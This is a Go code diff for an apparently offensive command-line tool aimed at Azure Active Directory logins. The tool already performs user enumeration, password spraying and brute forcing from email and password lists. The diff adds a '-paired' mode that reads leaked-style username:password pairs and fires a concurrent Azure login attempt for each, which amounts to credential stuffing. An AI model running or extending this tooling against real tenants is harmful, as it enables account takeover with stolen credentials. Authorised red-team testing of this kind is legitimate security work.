@@ -12,6 +12,7 @@ import (
 	"sync"
 	"time"
 )
+
 type Flag struct {
 	set   bool
 	value string
@@ -32,6 +33,7 @@ var (
 	password      Flag
 	emailsFile    Flag
 	passwordsFile Flag
+	paired        Flag
 	wg            sync.WaitGroup
 )
 
@@ -40,6 +42,7 @@ func init() {
 	flag.Var(&password, "password", "Example: P@ssw0rd!")
 	flag.Var(&emailsFile, "emails-file", "Example: /your/path/emails.txt")
 	flag.Var(&passwordsFile, "passwords-file", "Example: /your/path/passwords.txt")
+	flag.Var(&paired, "paired", "File containing list of credentials in username:password format")
 }
 
 func main() {
@@ -56,7 +59,7 @@ func main() {
 		wg.Add(1)
 		domain := strings.Split(email.value, "@")[1]
 		client := clients.NewAzureClient()
-		go client.GetAzureActiveDirectory(domain, email.value, password.value,&wg,output)
+		go client.GetAzureActiveDirectory(domain, email.value, password.value, &wg, output)
 	}
 	if emailsFile.set {
 		if _, err := os.Stat(emailsFile.value); os.IsNotExist(err) {
@@ -73,15 +76,23 @@ func main() {
 	if passwordsFile.set && emailsFile.set {
 		bruteForcing(emailsFile.value, passwordsFile.value, output)
 	}
+	if paired.set {
+		if _, err := os.Stat(paired.value); os.IsNotExist(err) {
+			println("[!] The file doesn't exist")
+			os.Exit(1)
+		} else {
+			pairedAttack(paired.value, output)
+		}
+	}
 	if email.set && passwordsFile.set {
 		domain := strings.Split(email.value, "@")[1]
 		client := clients.NewAzureClient()
-		passwordAttack := services.NewPasswordAttack(passwordsFile.value,email.value,domain,client,&wg, output)
-	    passwordAttack.Execute()
+		passwordAttack := services.NewPasswordAttack(passwordsFile.value, email.value, domain, client, &wg, output)
+		passwordAttack.Execute()
 	}
 	if emailsFile.set && password.set {
 		client := clients.NewAzureClient()
-		enumUsers := services.NewEnumUsers(emailsFile.value, password.value,client,&wg,output)
+		enumUsers := services.NewEnumUsers(emailsFile.value, password.value, client, &wg, output)
 		enumUsers.Execute()
 	}
 	wg.Wait()
@@ -102,6 +113,30 @@ func bruteForcing(usersFile string, passwordsFile string, writer io.Writer) {
 		passwordAttack.Execute()
 	}
 	if err := scannerUsers.Err(); err != nil {
+		log.Fatal(err)
+	}
+}
+func pairedAttack(pairedFile string, writer io.Writer) {
+	pairs, err := os.Open(pairedFile)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer pairs.Close()
+	scannerPairs := bufio.NewScanner(pairs)
+	for scannerPairs.Scan() {
+		wg.Add(1)
+		pair := strings.Split(scannerPairs.Text(), ":")
+		if len(pair) == 1 {
+			println("[!] Delimiter \":\" not found")
+			os.Exit(1)
+		}
+		mail := pair[0]
+		password := pair[1]
+		domain := strings.Split(mail, "@")[1]
+		client := clients.NewAzureClient()
+		go client.GetAzureActiveDirectory(domain, mail, password, &wg, writer)
+	}
+	if err := scannerPairs.Err(); err != nil {
 		log.Fatal(err)
 	}
 }
